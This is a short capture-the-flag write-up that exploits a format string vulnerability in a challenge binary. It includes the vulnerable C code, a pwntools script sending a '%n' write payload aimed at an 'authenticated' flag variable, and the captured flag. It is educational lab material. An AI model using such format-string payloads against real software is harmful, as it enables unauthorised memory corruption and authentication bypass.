# authpy

A quick look at the provided c file shows this interesting check that we have to pass
```c
void authenticate(char *user) {
    if (user == "1337_H4X0R")
        authenticated = true;
}
```

Further down the script, there appears to be a `printf` [vulnerability](https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b), since it is just printing what we input directly, without any formatter.

```c
    printf("Authenticating user: ");
    printf(username);
    printf("...\n");
    authenticate(username);
```

To exploit this, we need to find a place on the stack we control, then put our target address there.Then, we pass it in a `%n` to that position. This will write the number of bytes outputted from `printf` to the address. After some careful investigation, we can find where our input is on the stack, and attempt to write to the `authenticated` variable.


```python
from pwn import *
import re

HOST, PORT = "192.168.125.100", 9101
BINARY = './auth'

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY)
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def solve():
    p = start()
    
    payload = b'.%6$p.%7$p.%8$n.'
    payload += p64(0x404089)

    p.sendlineafter(":", payload)

    p.interactive()

solve()
```

```
ICTF{i_sw3AR_tHaT_buFF3R_w4s_b1g_en0uGH...}
```